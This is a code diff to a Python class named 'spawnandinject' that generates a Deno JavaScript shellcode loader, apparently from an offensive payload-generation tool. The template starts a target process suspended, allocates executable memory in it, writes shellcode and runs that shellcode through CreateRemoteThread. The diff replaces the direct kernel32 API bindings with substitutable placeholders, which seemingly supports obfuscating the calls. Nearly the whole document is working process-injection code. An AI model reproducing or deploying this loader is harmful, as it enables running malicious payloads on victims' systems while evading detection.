@@ -22,51 +22,24 @@ class spawnandinject:
     def template(self) -> str:
         return Template("""
     {transformers}
-    
-    const kernel32Path = "C:\\\\Windows\\\\System32\\\\kernel32.dll";
-    const kernel32 = Deno.dlopen(kernel32Path, {{
-        CreateProcessA: {{
-            parameters: ["buffer", "buffer", "buffer", "buffer", "i32", "u32", "buffer", "buffer", "buffer", "buffer"],
-            result: "i32",
-        }},
-        WriteProcessMemory: {{
-            parameters: ["pointer", "pointer", "buffer", "usize", "pointer"],
-            result: "i32",
-        }},
-        VirtualAllocEx: {{
-            parameters: ["pointer", "pointer", "usize", "u32", "u32"],
-            result: "pointer",
-        }},
-        CreateRemoteThread: {{
-            parameters: ["pointer", "pointer", "usize", "pointer", "pointer", "u32", "pointer"],
-            result: "pointer",
-        }},
-        WaitForSingleObject: {{
-            parameters: ["pointer", "u32"],
-            result: "u32",
-        }},
-        CloseHandle: {{
-            parameters: ["pointer"],
-            result: "i32",
-        }},
-    }});
 
     const si = new Uint8Array(104);
     const pi = new Uint8Array(24);
     const cmdline = Buffer.from('$target', 'utf8');
 
-    kernel32.symbols.CreateProcessA(null, cmdline, null, null, 0, 0x4, null, null, si, pi);
+    {CreateProcessA}(null, cmdline, null, null, 0, 0x4, null, null, si, pi);
 
     const view = new DataView(pi.buffer);
     const hProcess = view.getBigUint64(0, true);
     const hProc = Deno.UnsafePointer.create(hProcess);
 
-    const address = kernel32.symbols.VirtualAllocEx(hProc, null, {shellcodeSize}, 0x3000, 0x40);
+    const address = {VirtualAllocEx}(hProc, null, {shellcodeSize}, 0x3000, 0x40);
 
-    kernel32.symbols.WriteProcessMemory(hProc, address, shellcode, {shellcodeSize}, null);
+    {WriteProcessMemory}(hProc, address, shellcode, {shellcodeSize}, null);
     
-    const hThread = kernel32.symbols.CreateRemoteThread(hProc, null, 0, address, null, 0, null);
-    kernel32.symbols.WaitForSingleObject(hThread, 500);
-    kernel32.symbols.CloseHandle(hThread);
+    const hThread = {CreateRemoteThread}(hProc, null, 0, address, null, 0, null);
+    {WaitForSingleObject}(hThread, 500);
+    {CloseHandle}(hProc);
+    {CloseHandle}(hThread);
 
 """).substitute(target=self.target, memoryPermission=self.memoryPermission)
